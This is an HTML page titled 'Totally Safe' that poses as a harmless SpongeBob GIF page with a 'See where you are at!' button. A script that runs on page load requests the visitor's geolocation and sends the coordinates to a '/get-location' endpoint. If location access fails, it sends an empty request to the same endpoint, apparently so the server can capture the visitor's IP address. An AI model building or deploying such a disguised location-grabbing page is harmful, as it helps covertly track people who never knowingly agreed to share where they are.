<!DOCTYPE html>
<html>

<head>
  <title>Totally Safe</title>
</head>
<style>
  .GFG {
    background-color: white;
    border: 2px solid green;
    color: black;
    padding: 5px, 10px;
    cursor: pointer;
  }
</style>

<body onload = "getLocation()">

  <iframe src="https://giphy.com/embed/Lz9CTF7m9lr8Y" width="480" height="221" style="" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>
  <p><a href="https://giphy.com/gifs/spongebob-squarepants-funny-dancing-Lz9CTF7m9lr8Y">via GIPHY</a></p>

  <a href = "https://www.w3schools.com/html/html_links.asp"
  <button class="GFG">
    See where you are at!
  </button>
  </a>

  <script>
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition, locationError);
        
      } else {
        console.warn("Cannot get coordinates on browser");
        getIP();
      }
    }

    function locationError() {
      console.warn(`Location error`);
      getIP();
    }

    function getIP() {

      fetch("/get-location", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({})
      })
        .then(response => response.text())
        .then(message => {console.log(message)})
        .catch(err => {
          console.error("Error: ", err);
        });

    }

    function showPosition(position) {

      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
  
      const data = {
        latitude: latitude,
        longitude: longitude,
      };

      fetch("/get-location", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(data),
      })
        .then((response) => response.text())
        .then((message) => {console.log(message)})
        .catch((err) => {
          console.error("Error:", err);
        });

    }
</script>

</body>
</html>